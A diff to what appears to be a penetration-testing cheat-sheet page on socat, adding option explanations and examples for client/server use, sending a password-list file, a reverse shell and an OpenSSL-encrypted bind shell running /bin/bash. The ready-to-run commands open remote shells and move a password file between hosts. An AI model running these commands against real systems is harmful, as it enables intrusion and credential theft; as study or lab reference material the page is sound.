@@ -158,15 +158,38 @@ address-head:
 
 ### Examples
 
+#### Basic client/server
+
+**Server:**
+
+* `STDOUT` - redirects the standard output into the session
+
+```plain
+sudo socat TCP4:<remote-server>:80 STDOUT
+```
+
+**Client:**
+
+* `-` - allows STDIO to be received and interacted with via keyboard interaction
+
+```plain
+sudo socat - TCP4:<remote-server>:80
+```
+
 #### Send a file to receiver
 
-Sender:
+**Sender:**
+
+* `fork` - creates a child process once a connection is made, this allows for multiple connections
 
 ```plain
 sudo socat TCP4-LISTEN:443,fork file:list_of_passwords.txt
 ```
 
-Receiver:
+**Receiver:**
+
+* `file` - specifies the local file name to save the file to
+* `create` - specifies a new file will be created
 
 ```plain
 $ socat TCP4:10.11.0.4:443 file:list_of_passwords.txt,create
@@ -180,10 +203,15 @@ Summer2022!
 
 #### Reverse Shell
 
-Listener:
+**Listener:**
+
+* `-d -d` - option increases verbosity
+* `TCP4-LISTEN:443` - creates the IPv4 listener on port 443
+* `STDOUT` - connects to the standard output
 
 ```plain
-$ socat -d -d TCP4-LISTEN:443 STDOUT ... socat[4388] N listening on AF=2 0.0.0.0:443
+$ socat -d -d TCP4-LISTEN:443 STDOUT 
+... socat[4388] N listening on AF=2 0.0.0.0:443
 ... socat[4388] N accepting connection from AF=2 10.0.0.11:54720 on 10.0.0.10:443
 ... socat[4388] N using stdout for reading and writing
 ... socat[4388] N starting data transfer loop with FDs [4,4] and [1,1]
@@ -193,10 +221,30 @@ id
 uid=1000(kali) gid=1000(kali) groups=1000(kali)
 ```
 
-Target host:
+**Target host:**
+
+* `EXEC:/bin/bash` - states when the connection is established it will allow access to `/bin/bash`
 
 ```plain
 socat TCP4:10.0.0.10:443 EXEC:/bin/bash
+```
+
+#### Encrypted (bind/reverse) shell
+
+To create a certificate, please check [OpenSSL]({{< ref "openssl" >}}).
+
+##### Bind shell
+
+**Server:**
+
+```plain
+sudo socat OPENSSL-LISTEN:443,cert=yourcert.pem,verify=0,fork EXEC:/bin/bash
+```
+
+**Client:**
+
+```plain
+socat - OPENSSL:10.11.0.4:443,verify=0
 ```
 
 ### URL list
